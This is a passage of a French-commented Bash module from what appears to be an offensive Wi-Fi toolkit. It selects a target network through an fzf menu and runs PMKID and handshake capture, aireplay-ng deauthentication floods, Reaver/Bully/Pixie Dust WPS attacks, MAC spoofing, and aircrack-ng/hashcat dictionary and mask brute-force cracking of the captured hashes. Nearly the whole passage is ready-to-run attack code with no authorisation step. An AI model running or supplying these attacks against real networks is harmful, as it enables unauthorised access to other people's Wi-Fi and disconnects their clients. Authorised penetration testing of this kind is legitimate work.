  local out="${BALORSH_DATA_DIR}/wifi/captures/pmkid_$(date +%Y%m%d_%H%M%S)"

  if ! command -v hcxdumptool &>/dev/null; then
    echo -e "${C_RED}hcxdumptool n'est pas installé${C_RESET}"
    return
  fi

  echo -e "${C_HIGHLIGHT}$(printf "$WIFI_CAPTURE_PMKID_ON" "$iface")${C_RESET}"
  # Utilise le drapeau de sortie détecté pour éviter "invalid option -o" sur certains systèmes
  oflag=$(hcxdumptool_output_flag || true)
  sflag=$(hcxdumptool_status_flag || true)
  if [[ -n "$oflag" ]]; then
    if [[ -n "$sflag" ]]; then
      sudo hcxdumptool -i "$iface" "$sflag" "$oflag" "${out}.pcapng" || true
    else
      sudo hcxdumptool -i "$iface" "$oflag" "${out}.pcapng" || true
    fi
    # Tente la conversion et les métadonnées après la capture
    if command -v hcxpcapngtool &>/dev/null; then
      local conv_out
      conv_out=$(sudo hcxpcapngtool -o "${out}.hc22000" "${out}.pcapng" 2>&1 || true)
      if [[ -f "${out}.hc22000" ]]; then
        echo -e "${C_GOOD}$(printf "$WIFI_FILE_CONVERTED" "${out}.hc22000")${C_RESET}"
        write_hash_metadata "${out}.hc22000" "${out}.pcapng" "$conv_out" || true
      else
        echo -e "${C_RED}Conversion échouée${C_RESET}"
        printf '%s\n' "$conv_out"
      fi
    else
      echo -e "${C_YELLOW}$WIFI_HCXPCAPNGTOOL_NOT_AVAILABLE : ${out}.pcapng${C_RESET}";
    fi
  else
    echo -e "${C_YELLOW}$WIFI_OUTPUT_NOT_SUPPORTED_USING_AIRODUMP${C_RESET}"
    sudo airodump-ng -w "$out" --write-interval 1 --output-format pcap,csv,netxml "$iface"
    echo -e "${C_GOOD}$WIFI_FILES_GENERATED : ${out}-01.cap / ${out}-01.csv${C_RESET}"
    return
  fi

  if command -v hcxpcapngtool &>/dev/null; then
    local hashout="${out}.hc22000"
    sudo hcxpcapngtool -o "$hashout" "${out}.pcapng" || true
    if [[ -f "$hashout" ]]; then
      echo -e "${C_GOOD}$WIFI_CONVERSION_SUCCESSFUL : $hashout${C_RESET}"
    fi
  else
    echo -e "${C_HIGHLIGHT}$WIFI_CAPTURE_SAVED: ${out}.pcapng${C_RESET}"
  fi
}

# ----- Sélection de cible TUI (fzf) -----
wifi_select_target_tui() {
  clear
  local iface="${1:-$IFACE}"
  if [[ -z "$iface" ]]; then wifi_select_iface || return; iface="$IFACE"; fi

  if ! command -v fzf &>/dev/null; then
    echo -e "${C_RED}fzf n'est pas installé. Installez-le avec: sudo apt install fzf${C_RESET}"
    return
  fi

  # Vérifier que l'interface est en mode monitor
  if ! wifi_check_monitor_mode "$iface"; then
    echo -e "${C_YELLOW}L'interface $iface n'est pas en mode monitor. Activation...${C_RESET}"
    wifi_start_monitor_mode "$iface" || {
      echo -e "${C_RED}Impossible d'activer le mode monitor${C_RESET}"
      return 1
    }
  fi

  # Scan rapide pour collecter les BSSIDs
  : "${BALORSH_DATA_DIR:=/opt/balorsh/data}"
  mkdir -p "$BALORSH_DATA_DIR/wifi/scans"
  local tmpdir="$BALORSH_DATA_DIR/wifi/scans/tmp_$(date +%Y%m%d_%H%M%S)"
  mkdir -p "$tmpdir"
  echo -e "${C_INFO}Scan en cours (15 secondes)...${C_RESET}"
  sudo timeout 15 airodump-ng -w "$tmpdir/scan" --output-format csv "$iface" 2>/dev/null || true
  local csv
  csv=$(find "$tmpdir" -name "*.csv" -type f 2>/dev/null | head -n1 || true)
  if [[ -z "$csv" || ! -f "$csv" ]]; then
    echo -e "${C_RED}Échec du scan ou aucun réseau détecté.${C_RESET}";
    echo -e "${C_YELLOW}Vérifiez que l'interface est en mode monitor et qu'il y a des réseaux WiFi à proximité.${C_RESET}"
    echo -e "${C_INFO}Interface utilisée: $iface${C_RESET}"
    rm -rf "$tmpdir" 2>/dev/null || true
    return
  fi

  # Analyse le CSV pour BSSID, canal, ESSID, et puissance du signal
  echo -e "${C_GOOD}Réseaux détectés - sélectionnez avec fzf (↑↓ pour naviguer, Entrée pour valider):${C_RESET}"
  
  # Préparer les données pour fzf
  local networks_list
  networks_list=$(awk -F',' 'NR>2 && NF>13 && $1 ~ /^[0-9A-Fa-f:]+$/ && length($1)==17 {
    gsub(/^ +| +$/,"",$1); 
    gsub(/^ +| +$/,"",$4); 
    gsub(/^ +| +$/,"",$6);
    gsub(/^ +| +$/,"",$9);
    gsub(/^ +| +$/,"",$14); 
    if($1 != "") printf "%s\tCH:%s\tPWR:%sdBm\tENC:%s\t%s\n", $1, $4, $9, $6, $14
  }' "$csv" | sed '/^$/d')
  
  if [[ -z "$networks_list" ]]; then
    echo -e "${C_RED}Aucun réseau trouvé dans le scan.${C_RESET}"
    echo -e "${C_INFO}Fichier CSV: $csv${C_RESET}"
    rm -rf "$tmpdir" 2>/dev/null || true
    return
  fi
  
  local selected
  selected=$(echo "$networks_list" | fzf --prompt='🎯 Sélectionner cible WiFi: ' --height=60% --reverse --border --header='BSSID              Canal  Puissance  Chiffrement  ESSID' || true)
  
  if [[ -z "$selected" ]]; then
    echo -e "${C_YELLOW}Aucune cible sélectionnée${C_RESET}"
    rm -rf "$tmpdir" 2>/dev/null || true
    return
  fi
  
  local target_bssid=$(echo "$selected" | awk '{print $1}')
  local target_channel=$(echo "$selected" | awk -F'CH:' '{print $2}' | awk '{print $1}')
  local target_essid=$(echo "$selected" | awk -F'\t' '{print $NF}')
  
  clear
  echo -e "${C_ACCENT1}═══════════════════════════════════════════════════════════${C_RESET}"
  echo -e "${C_GOOD}✓ Cible sélectionnée${C_RESET}"
  echo -e "${C_ACCENT1}═══════════════════════════════════════════════════════════${C_RESET}"
  echo -e "  BSSID   : ${C_INFO}$target_bssid${C_RESET}"
  echo -e "  Canal   : ${C_INFO}$target_channel${C_RESET}"
  echo -e "  ESSID   : ${C_INFO}$target_essid${C_RESET}"
  echo ""
  
  # Proposer des actions
  echo -e "${C_HIGHLIGHT}Que voulez-vous faire ?${C_RESET}"
  echo -e "  ${C_GOOD}1)${C_RESET} Capturer handshake (airodump-ng)"
  echo -e "  ${C_GOOD}2)${C_RESET} Attaque deauth"
  echo -e "  ${C_GOOD}3)${C_RESET} Attaque WPS"
  echo -e "  ${C_GOOD}4)${C_RESET} Copier les infos dans le presse-papier"
  echo -e "  ${C_SHADOW}0)${C_RESET} Retour au menu"
  echo ""
  echo -ne "${C_ACCENT1}Votre choix: ${C_RESET}"
  read -r action
  
  case "$action" in
    1)
      # Capture handshake
      local capture_dir="$BALORSH_DATA_DIR/wifi/captures"
      mkdir -p "$capture_dir"
      local outfile="$capture_dir/handshake_$(echo $target_essid | tr ' ' '_')_$(date +%Y%m%d_%H%M%S)"
      echo -e "${C_HIGHLIGHT}Capture du handshake pour $target_essid sur le canal $target_channel...${C_RESET}"
      echo -e "${C_INFO}Astuce: Dans un autre terminal, lancez une attaque deauth pour forcer la reconnexion${C_RESET}"
      sudo airodump-ng --bssid "$target_bssid" -c "$target_channel" -w "$outfile" "$iface"
      ;;
    2)
      # Attaque deauth
      echo -e "${C_INFO}Clients détectés pour ce BSSID:${C_RESET}"
      awk -F',' -v target="$target_bssid" 'BEGIN{clients=0} /^Station MAC/ {clients=1; next} clients==1 && NF>5 && $1 ~ /^[0-9A-Fa-f:]+$/ {gsub(/^ +| +$/,"",$1); gsub(/^ +| +$/,"",$6); if($6 == target) printf "  %s\n", $1}' "$csv" | grep -v '^$' || echo "  ${C_YELLOW}Aucun client détecté${C_RESET}"
      echo ""
      echo -ne "${C_HIGHLIGHT}MAC du client (Entrée pour tous): ${C_RESET}"
      read -r client_mac
      echo -ne "${C_HIGHLIGHT}Nombre de paquets deauth [10]: ${C_RESET}"
      read -r deauth_count
      deauth_count="${deauth_count:-10}"
      
      if [[ -z "$client_mac" ]]; then
        sudo aireplay-ng --deauth "$deauth_count" -a "$target_bssid" "$iface" || echo -e "${C_RED}Erreur deauth${C_RESET}"
      else
        sudo aireplay-ng --deauth "$deauth_count" -a "$target_bssid" -c "$client_mac" "$iface" || echo -e "${C_RED}Erreur deauth${C_RESET}"
      fi
      ;;
    3)
      # Attaque WPS
      echo -e "${C_HIGHLIGHT}Attaque WPS sur $target_essid...${C_RESET}"
      echo -e "  ${C_GOOD}1)${C_RESET} Reaver"
      echo -e "  ${C_GOOD}2)${C_RESET} Bully"
      echo -e "  ${C_GOOD}3)${C_RESET} Pixie Dust (reaver)"
      echo -ne "${C_ACCENT1}Choix [1]: ${C_RESET}"
      read -r wps_choice
      wps_choice="${wps_choice:-1}"
      case "$wps_choice" in
        1) sudo reaver -i "$iface" -b "$target_bssid" -c "$target_channel" -vv ;;
        2) sudo bully -b "$target_bssid" -c "$target_channel" "$iface" ;;
        3) sudo reaver -i "$iface" -b "$target_bssid" -c "$target_channel" -K 1 -vv ;;
      esac
      ;;
    4)
      # Copier dans le presse-papier
      if command -v xclip &>/dev/null; then
        echo "BSSID: $target_bssid | Canal: $target_channel | ESSID: $target_essid" | xclip -selection clipboard
        echo -e "${C_GOOD}✓ Informations copiées dans le presse-papier${C_RESET}"
      elif command -v wl-copy &>/dev/null; then
        echo "BSSID: $target_bssid | Canal: $target_channel | ESSID: $target_essid" | wl-copy
        echo -e "${C_GOOD}✓ Informations copiées dans le presse-papier (Wayland)${C_RESET}"
      else
        echo -e "${C_YELLOW}xclip ou wl-clipboard non installé${C_RESET}"
        echo -e "${C_INFO}BSSID: $target_bssid | Canal: $target_channel | ESSID: $target_essid${C_RESET}"
      fi
      ;;
    0|"")
      echo -e "${C_INFO}Retour au menu...${C_RESET}"
      ;;
    *)
      echo -e "${C_RED}Choix invalide${C_RESET}"
      ;;
  esac
  
  rm -rf "$tmpdir" || true
}

# ----- Pipeline de cracking (aircrack/hashcat) -----
wifi_crack_pipeline() {
  echo "$WIFI_PROMPT_HASH_FILE"
  read -r hashfile
  if [[ ! -f "$hashfile" ]]; then echo -e "${C_RED}$WIFI_FILE_NOT_FOUND${C_RESET}"; return 1; fi

  echo "$WIFI_WORDLIST_CHOOSE"
  local sel
  sel=$(select_wordlist) || return 1
  prepare_wordlist "$sel" || return 1
  local wl="$PREP_WORDLIST_PATH"
  if [[ ! -f "$wl" ]]; then echo -e "${C_RED}$(printf "$WIFI_WORDLIST_NOT_FOUND" "$wl")${C_RESET}"; cleanup_prepared_wordlist; return 1; fi

  echo "$WIFI_PROMPT_TOOL_CHOICE"
  read -r choice
  choice="${choice:-2}"
  if [[ "$choice" == "1" ]]; then
    echo -e "${C_HIGHLIGHT}$WIFI_CRACK_AIRCRACK${C_RESET}"
    sudo aircrack-ng -w "$wl" "$hashfile"
  else
    echo -e "${C_HIGHLIGHT}$WIFI_CRACK_HASHCAT${C_RESET}"
    sudo hashcat -m 22000 -a 0 "$hashfile" "$wl" --status --status-timer=15
  fi

  cleanup_prepared_wordlist
}

# ----- Randomisation MAC -----
wifi_random_mac() {
  local iface="${1:-$IFACE}"
  if [[ -z "$iface" ]]; then wifi_select_iface || return 1; iface="$IFACE"; fi
  if command -v macchanger &>/dev/null; then
    sudo ip link set "$iface" down
    sudo macchanger -r "$iface"
    sudo ip link set "$iface" up
    printf "$WIFI_MAC_RANDOMIZED\n" "$iface"
  else
    # repli : génère une MAC unicast administrée localement aléatoire
    local mac
    mac=$(printf '02:%02X:%02X:%02X:%02X:%02X' $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)))
    sudo ip link set dev "$iface" address "$mac"
    printf "$WIFI_MAC_CHANGED\n" "$mac"
  fi
}

# ----- Nettoyage / restauration -----
wifi_cleanup() {
  local iface="${1:-$IFACE}"
  if [[ -n "$iface" ]]; then
    wifi_stop_monitor_mode "$iface" || true
  fi
  # tue les outils communs
  pkill -f airodump-ng 2>/dev/null || true
  pkill -f aireplay-ng 2>/dev/null || true
  pkill -f hcxdumptool 2>/dev/null || true
  echo "$WIFI_CLEANUP_DONE"
}

# ----- Hopper de canaux adaptatif -----
wifi_channel_hop_adaptive() {
  local iface="${1:-$IFACE}"
  if [[ -z "$iface" ]]; then wifi_select_iface || return 1; iface="$IFACE"; fi
  printf "${C_HIGHLIGHT}$WIFI_CHANNEL_HOPPING_ADAPTIVE...${C_RESET}\n" "$iface"
  while true; do
    # scan rapide pour trouver les canaux actifs via iwlist (peut nécessiter root)
    local chans
    chans=$(sudo iwlist "$iface" scan 2>/dev/null | awk -F: '/Channel/ {print $2}' | sort -n | uniq | tr '\n' ' ')
    if [[ -z "$chans" ]]; then chans="1 6 11"; fi
    for ch in $chans; do
      wifi_set_channel "$iface" "$ch"
      printf "\rCanal: %2d" "$ch"
      # reste plus longtemps sur les canaux susceptibles d'être peuplés
      sleep 0.6
    done
  done
}

# ----- Enrichir les infos BSSID (recherche OUI) -----
wifi_enrich_bssid() {
  local bssid="$1"
  if [[ -z "$bssid" ]]; then echo "$WIFI_USAGE_ENRICH_BSSID"; return 1; fi
  # essaie le fichier OUI local
  if [[ -f "/usr/share/ieee-data/oui.txt" ]]; then
    awk -v b="$bssid" 'BEGIN{IGNORECASE=1}{if(tolower($0) ~ tolower(substr(b,1,8))) print $0}' "/usr/share/ieee-data/oui.txt" | head -n1
  else
    echo "$WIFI_OUI_NOT_FOUND"
  fi
}

# ----- Export Kismet/GPX (basique) -----
wifi_export_kismet() {
  : "${BALORSH_DATA_DIR:=/opt/balorsh/data}"
  local src_dir="${1:-$BALORSH_DATA_DIR/wifi/captures}"
  local out="${2:-$BALORSH_DATA_DIR/wifi/export_$(date +%Y%m%d_%H%M%S)}"
  mkdir -p "$out"
  cp -a "$src_dir"/* "$out" 2>/dev/null || true
  printf "$WIFI_EXPORT_COPIED\n" "$out"
}

# ----- Messages d'aide -----
wifi_help() {
  echo -e "$WIFI_HELP_TITLE

$WIFI_HELP_1
$WIFI_HELP_2
$WIFI_HELP_3
$WIFI_HELP_4
$WIFI_HELP_5
$WIFI_HELP_6
$WIFI_HELP_7
$WIFI_HELP_8
$WIFI_HELP_9
$WIFI_HELP_10
$WIFI_HELP_11
$WIFI_HELP_12
$WIFI_HELP_13
$WIFI_HELP_14
$WIFI_HELP_15
$WIFI_HELP_16
$WIFI_HELP_17
$WIFI_HELP_18
$WIFI_HELP_19
$WIFI_HELP_20
$WIFI_HELP_21
$WIFI_HELP_22
$WIFI_HELP_23

$WIFI_HELP_DEPS
$WIFI_HELP_DEPS_HCXTOOLS
$WIFI_HELP_DEPS_FZF
$WIFI_HELP_DEPS_MACCHANGER
$WIFI_HELP_DEPS_CRACKERS

$WIFI_HELP_FOOTER"
}

# ----- Aide au redémarrage de NetworkManager -----
wifi_restart_networkmanager() {
  echo -e "${C_HIGHLIGHT}$WIFI_ATTEMPTING_RESTART_NM${C_RESET}"
  if command -v systemctl &>/dev/null; then
    if sudo systemctl restart NetworkManager; then
      echo -e "${C_GOOD}$WIFI_NM_RESTARTED_SUCCESS${C_RESET}"
      return 0
    else
      echo -e "${C_RED}$WIFI_RESTART_FAILED_SYSTEMCTL${C_RESET}"
    fi
  fi

  # repli : essaie nmcli
  if command -v nmcli &>/dev/null; then
    sudo nmcli networking off || true
    sleep 1
    sudo nmcli networking on || true
    echo -e "${C_GOOD}$WIFI_NMCLI_NETWORKING_TOGGLED${C_RESET}"
    return 0
  fi

  echo -e "${C_RED}$WIFI_CANNOT_RESTART_NM_AUTO${C_RESET}"
  return 1
}

# Convertir capture en format hashcat (sortie --> $BALORSH_DATA_DIR/wifi/hashes)
wifi_convert_handshake() {
  clear
  # dossier de sortie centralisé
  : "${BALORSH_DATA_DIR:=/opt/balorsh/data}"
  local hash_dir="$BALORSH_DATA_DIR/wifi/hashes"
  mkdir -p "$hash_dir" || { echo -e "${C_RED}$WIFI_ERROR_CREATE_DIR $hash_dir${C_RESET}"; return; }

  # lecture fichier source (prompt sur stderr pour être sûr d'afficher)
  echo -ne "$WIFI_PROMPT_CAPTURE_FILE" >&2
  read -r capfile
  if [[ ! -f "$capfile" ]]; then
    echo -e "${C_RED}$(printf "$WIFI_FILE_NOT_FOUND" "$capfile")${C_RESET}" >&2
    return 1
  fi

  # nom de base propre
  local base
  base="$(basename "${capfile%.*}")"
  local ts
  ts="$(date +%Y%m%d_%H%M%S)"

  # Choix d'outil : privilégie hcxpcapngtool, repli sur cap2hccapx
  if command -v hcxpcapngtool &>/dev/null; then
    local out_file="$hash_dir/${base}_${ts}.hc22000"
    echo -e "${C_HIGHLIGHT}$WIFI_CONVERTING_WITH_HCXPCAPNGTOOL $out_file${C_RESET}" >&2
    sudo hcxpcapngtool -o "$out_file" "$capfile"
    if [[ $? -ne 0 || ! -f "$out_file" ]]; then
      echo -e "${C_RED}$WIFI_HCXPCAPNGTOOL_FAILED_SHORT${C_RESET}" >&2
      return 1
    fi
    echo -e "${C_GOOD}$WIFI_FILE_CONVERTED $out_file${C_RESET}"
    return 0

  elif command -v cap2hccapx &>/dev/null; then
    # cap2hccapx génère généralement un .hccapx (plus ancien), on le nomme clairement
    local out_file="$hash_dir/${base}_${ts}.hccapx"
    echo -e "${C_HIGHLIGHT}$WIFI_CONVERTING_WITH_CAP2HCCAPX $out_file${C_RESET}" >&2
    sudo cap2hccapx "$capfile" "$out_file"
    if [[ $? -ne 0 || ! -f "$out_file" ]]; then
      echo -e "${C_RED}$WIFI_CAP2HCCAPX_FAILED${C_RESET}" >&2
      return 1
    fi
    echo -e "${C_GOOD}$WIFI_FILE_CONVERTED $out_file${C_RESET}"
    return 0

  else
    echo -e "${C_RED}$WIFI_NEITHER_TOOL_FOUND${C_RESET}" >&2
    return 1
  fi
}

# Retourne soit un fichier (rockyou ou chemin personnalisé) soit un répertoire (pour concaténation récursive).
select_wordlist() {
  local base_dir="/usr/share/wordlists/seclists/Passwords"
  local default_list="$base_dir/Leaked-Databases/rockyou.txt"

  # Affiche sur stderr pour forcer l'affichage à l'écran
  {
    echo "$WIFI_WORDLIST_CHOOSE"
    echo "$WIFI_WORDLIST_OPT_ROCKYOU"
    printf "$WIFI_ALL_TXT_RECURSIVE_IN\n" 2 "$base_dir"
    printf "$WIFI_ALL_TXT_RECURSIVE_IN\n" 3 "/usr/share/wordlists/seclists/Fuzzing"
    printf "$WIFI_ALL_TXT_RECURSIVE_IN\n" 4 "/usr/share/wordlists/seclists/Miscellaneous"
    echo "$WIFI_WORDLIST_OPT_CUSTOM"
  } >&2

  read -rp "$WIFI_PROMPT_YOUR_CHOICE [1]: " choice
  choice="${choice:-1}"

  case "$choice" in
    1)
      echo "$default_list"
      ;;
    2)
      echo "$base_dir"
      ;;
    3)
      echo "/usr/share/wordlists/seclists/Fuzzing"
      ;;
    4)
      echo "/usr/share/wordlists/seclists/Miscellaneous"
      ;;
    5)
      read -rp "$WIFI_PROMPT_FULL_PATH" custom_path
      if [[ -e "$custom_path" ]]; then
        echo "$custom_path"
      else
        echo "$WIFI_FILE_NOT_FOUND" >&2
        return 1
      fi
      ;;
    *)
      echo "$WIFI_CHOICE_INVALID" >&2
      return 1
      ;;
  esac
}

# Prépare la wordlist à partir du choix :
# - si $1 est un fichier existant : PREP_WORDLIST_PATH=fichier ; PREP_WORDLIST_TMP=0
# - si $1 est un dossier : concatène tous les .txt récursifs dans un fichier tmp, PREP_WORDLIST_TMP=1
prepare_wordlist() {
  local sel="$1"
  PREP_WORDLIST_PATH=""
  PREP_WORDLIST_TMP=0

  if [[ -f "$sel" ]]; then
    PREP_WORDLIST_PATH="$sel"
    PREP_WORDLIST_TMP=0
    return 0
  fi

  if [[ -d "$sel" ]]; then
    # Trouve tous les fichiers .txt récursifs
    mapfile -t files < <(find "$sel" -type f -name '*.txt' -print)
    if (( ${#files[@]} == 0 )); then
      printf "$WIFI_FILE_NOT_FOUND (.txt dans %s)\n" "$sel" >&2
      return 1
    fi

    # Compte et taille estimée
    local count=${#files[@]}
    # Calculer taille totale (du -ch)
    local total_size
    # du peut échouer si beaucoup de fichiers -> ignorer erreurs
    total_size=$(du -ch "${files[@]}" 2>/dev/null | tail -n1 | awk '{print $1}' || echo "unknown")

    printf "${C_INFO}$WIFI_CATEGORY_FILES_SIZE${C_RESET}\n" "$count" "$total_size"
    read -rp "$WIFI_CONCATENATE_ALL_FILES [y/N]: " ans
    ans="${ans:-N}"
    if [[ "${ans,,}" != "y" ]]; then
      echo -e "${C_YELLOW}$WIFI_OPERATION_CANCELLED${C_RESET}"
      return 1
    fi

    # Crée tmp et concatène (gestion des espaces dans les noms)
    local tmp
    tmp=$(mktemp /tmp/wordlist.XXXXXX.txt) || { echo -e "${C_RED}$WIFI_ERROR_CREATE_TEMP_FILE${C_RESET}" >&2; return 1; }
    # Concaténation sûre en binaire, préserve l'ordre que find retourne (lexicographique)
    find "$sel" -type f -name '*.txt' -print0 | xargs -0 -I{} sh -c 'cat "$1" >> "$2"' _ {} "$tmp"
    PREP_WORDLIST_PATH="$tmp"
    PREP_WORDLIST_TMP=1
    echo -e "${C_GOOD}$WIFI_TEMP_FILE_GENERATED $PREP_WORDLIST_PATH${C_RESET}"
    return 0
  fi

  echo -e "${C_RED}$WIFI_ERROR_INVALID_PATH : $sel${C_RESET}" >&2
  return 1
}

cleanup_prepared_wordlist() {
  if [[ "${PREP_WORDLIST_TMP:-0}" -eq 1 && -n "${PREP_WORDLIST_PATH:-}" ]]; then
    rm -f -- "$PREP_WORDLIST_PATH" || true
    PREP_WORDLIST_PATH=""
    PREP_WORDLIST_TMP=0
  fi
}

# Construit des fichiers d'exclusion dédupliqués par longueur depuis une ou plusieurs wordlists.
# Utilisation: build_excludes <source_file_or_dir> <outdir> <minlen> <maxlen> <mem_limit>
# - source peut être un fichier ou un répertoire (si rép., tous les .txt sont concaténés)
# - outdir sera créé et contiendra des fichiers nommés exclude.len<N>
# Cela diffuse l'entrée via awk pour éviter de charger l'ensemble de données en mémoire, puis
# exécute `sort -u -S` par longueur pour dédupliquer (limite mémoire configurable).
build_excludes() {
  local src="$1" outdir="${2:-/tmp/bf_exclude_bylen}" minlen="${3:-1}" maxlen="${4:-63}" mem="${5:-1G}"
  if [[ -z "$src" ]]; then echo "build_excludes: missing source" >&2; return 1; fi
  mkdir -p "$outdir" || { echo "Cannot create $outdir" >&2; return 1; }

  # Prépare un flux d'entrée : si src est un fichier, le cat ; si répertoire, trouve les fichiers .txt
  local inpipe
  inpipe=$(mktemp -u)
  if [[ -f "$src" ]]; then
    cat "$src" | awk -v min="$minlen" -v max="$maxlen" -v out="$outdir" '{
      l=length($0); if(l>=min && l<=max) print > (out "/exclude.len" l)
    }'
  elif [[ -d "$src" ]]; then
    # diffuse chaque .txt via find pour préserver une faible utilisation mémoire
    find "$src" -type f -name '*.txt' -print0 | xargs -0 -I{} sh -c 'awk -v min="'"$minlen"'" -v max="'"$maxlen"'" -v out="'"$outdir"'" "{ l=length(\$0); if(l>=min && l<=max) print > (out \"/exclude.len\" l) }" {}'
  else
    echo "Source $src not found" >&2
    return 1
  fi

  # Déduplique chaque fichier généré en utilisant sort -u avec limite mémoire
  for f in "$outdir"/exclude.len*; do
    if [[ -f "$f" ]]; then
      # utilise un fichier temporaire dans le même répertoire pour éviter les problèmes cross-filesystem
      local tmpf="$f.tmp"
      if command -v sort >/dev/null 2>&1; then
        sort -u -S "$mem" -T "$(dirname "$f")" "$f" -o "$tmpf" 2>/dev/null || sort -u "$f" -o "$tmpf" || true
        mv -f "$tmpf" "$f" || true
      fi
    fi
  done
  echo "Excludes built in: $outdir"
  return 0
}

# Interface interactive pour construire les exclusions (utilise les aides select_wordlist/prepare_wordlist)
wifi_build_excludes() {
  echo "$WIFI_PREPARE_EXCLUSION_INDEX"
  local sel
  sel=$(select_wordlist) || return 1
  prepare_wordlist "$sel" || return 1
  local src="$PREP_WORDLIST_PATH"
  if [[ -z "$src" || ! -f "$src" ]]; then echo -e "${C_RED}$WIFI_ERROR_NO_SOURCE_FILE${C_RESET}"; cleanup_prepared_wordlist; return 1; fi

  read -rp "$WIFI_OUTDIR_FOR_EXCLUSIONS: " outdir
  outdir="${outdir:-/tmp/bf_exclude_bylen}"
  read -rp "$WIFI_MIN_LENGTH_PROMPT: " minl
  minl="${minl:-1}"
  read -rp "$WIFI_MAX_LENGTH_PROMPT: " maxl
  maxl="${maxl:-63}"
  read -rp "$WIFI_MEMORY_LIMIT_FOR_SORT: " mem
  mem="${mem:-1G}"

  printf "${C_INFO}$WIFI_BUILDING_EXCLUSION_FILES${C_RESET}\n" "$outdir" "$minl" "$maxl" "$mem"
  build_excludes "$src" "$outdir" "$minl" "$maxl" "$mem"
  cleanup_prepared_wordlist
  echo -e "${C_GOOD}$WIFI_EXCLUSION_DIR_USABLE : $outdir${C_RESET}"
}

# Crack avec aircrack-ng (utilise select_wordlist => prepare_wordlist => lance)
wifi_crack_aircrack() {
  clear
  echo -ne "$WIFI_CAPTURE_FILE_CAP: "
  read -r capfile
  if [[ ! -f "$capfile" ]]; then
    echo -e "${C_RED}$WIFI_ERROR_CAPTURE_FILE_NOT_FOUND${C_RESET}"
    return
  fi

  echo "$WIFI_WORDLIST_SELECTION"
  local sel
  sel=$(select_wordlist) || { echo -e "${C_YELLOW}Sélection annulée${C_RESET}"; return; }

  prepare_wordlist "$sel" || { echo -e "${C_RED}Erreur de préparation de la wordlist${C_RESET}"; return; }
  local wl="$PREP_WORDLIST_PATH"

  if [[ ! -f "$wl" ]]; then
    echo -e "${C_RED}$WIFI_WORDLIST_NOT_FOUND_AFTER_PREP_SIMPLE $wl${C_RESET}"
    cleanup_prepared_wordlist
    return
  fi

  echo -e "${C_HIGHLIGHT}$WIFI_LAUNCHING_AIRCRACK_WITH_WORDLIST $wl${C_RESET}"
  sudo aircrack-ng -w "$wl" "$capfile" || echo -e "${C_YELLOW}Crack non réussi ou interrompu${C_RESET}"

  cleanup_prepared_wordlist
}

# Crack avec hashcat (utilise la même préparation)
wifi_crack_hashcat() {
  clear
  echo -ne "$WIFI_HASH_CAPTURE_FILE_PROMPT: "
  read -r hashfile
  if [[ ! -f "$hashfile" ]]; then
    echo -e "${C_RED}$(printf "$WIFI_FILE_NOT_FOUND" "$hashfile")${C_RESET}"
    return
  fi

  echo "$WIFI_WORDLIST_SELECTION"
  local sel
  sel=$(select_wordlist) || { echo -e "${C_YELLOW}Sélection annulée${C_RESET}"; return; }

  prepare_wordlist "$sel" || { echo -e "${C_RED}Erreur de préparation de la wordlist${C_RESET}"; return; }
  local wl="$PREP_WORDLIST_PATH"

  if [[ ! -f "$wl" ]]; then
    echo -e "${C_RED}$(printf "$WIFI_WORDLIST_NOT_FOUND_AFTER_PREP" "$wl")${C_RESET}"
    cleanup_prepared_wordlist
    return
  fi

  echo -e "${C_HIGHLIGHT}$WIFI_HASHCAT_LAUNCH (mode 22000) $WIFI_WITH_WORDLIST : $wl${C_RESET}"
  sudo hashcat -m 22000 -a 0 "$hashfile" "$wl" --status --status-timer=15 || echo -e "${C_YELLOW}Crack non réussi ou interrompu${C_RESET}"

  cleanup_prepared_wordlist
}

# Bruteforce via masque hashcat (-a 3). Supporte les classes intégrées ou charset personnalisé via -1.
wifi_bruteforce() {
  echo -ne "$WIFI_HASH_CAPTURE_FILE_HC22000_PROMPT: "
  read -r hashfile
  if [[ ! -f "$hashfile" ]]; then
    echo -e "${C_RED}$(printf "$WIFI_FILE_NOT_FOUND" "$hashfile")${C_RESET}"
    return 1
  fi

  echo "$WIFI_CHOOSE_CHARSET"
  echo "  1) lowercase (a-z)"
  echo "  2) uppercase (A-Z)"
  echo "  3) digits (0-9)"
  echo "  4) lowercase+digits"
  echo "  5) full (lower+upper+digits+symbols)"
  echo "  6) $WIFI_CUSTOM_ENTER_CHARS"
  read -rp "$WIFI_PROMPT_YOUR_CHOICE [1]: " cchoice
  cchoice="${cchoice:-1}"

  local chars="" use_builtin=0 builtin_token=""
  case "$cchoice" in
    1) use_builtin=1; builtin_token='?l' ;;
    2) use_builtin=1; builtin_token='?u' ;;
    3) use_builtin=1; builtin_token='?d' ;;
    4) chars="abcdefghijklmnopqrstuvwxyz0123456789" ;;
    5) chars="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%&*()_+-=[]{};:'\"\\|,<.>/?\`~" ;;
    6) read -rp "Saisir caractères (ex: abc123!@#): " chars ;;
    *) echo "$WIFI_CHOICE_INVALID"; return 1 ;;
  esac

  read -rp "$WIFI_MIN_LENGTH [1]: " minl
  minl="${minl:-1}"
  read -rp "$WIFI_MAX_LENGTH [min..63] [8]: " maxl
  maxl="${maxl:-8}"
  if ! [[ "$minl" =~ ^[0-9]+$ && "$maxl" =~ ^[0-9]+$ && $minl -le $maxl ]]; then
    echo -e "${C_RED}$WIFI_ERROR_INVALID_LENGTH_RANGES_BRUTEFORCE${C_RESET}"; return 1
  fi

  # Applique la longueur minimale de masque du kernel GPU (les GPUs courants nécessitent >=8)
  if command -v hashcat >/dev/null 2>&1; then
    local gpu_min=8
    if (( minl < gpu_min )); then
      echo "$WIFI_GPU_MIN_LENGTH_NOTE $gpu_min."
      printf "$WIFI_ADJUST_MIN_LENGTH\n" "$minl" "$gpu_min" >&2
      minl=$gpu_min
      if (( minl > maxl )); then
        echo "$WIFI_AFTER_ADJUST_CANCEL"; return 1
      fi
    fi
  fi

  printf "$WIFI_CONFIRM_BRUTEFORCE (Ctrl+C $WIFI_TO_CANCEL)\n" "$hashfile" "$cchoice" "$minl" "$maxl"
  read -rp "$WIFI_START_QUESTION [y/N]: " ans
  if [[ "${ans,,}" != "y" ]]; then echo -e "${C_YELLOW}Opération annulée${C_RESET}"; return 1; fi

  # Exclusion : si l'utilisateur veut exclure rockyou.txt, construit les fichiers par longueur
  read -rp "$WIFI_EXCLUDE_ROCKYOU_QUESTION [y/N]: " exans
  exans="${exans:-N}"
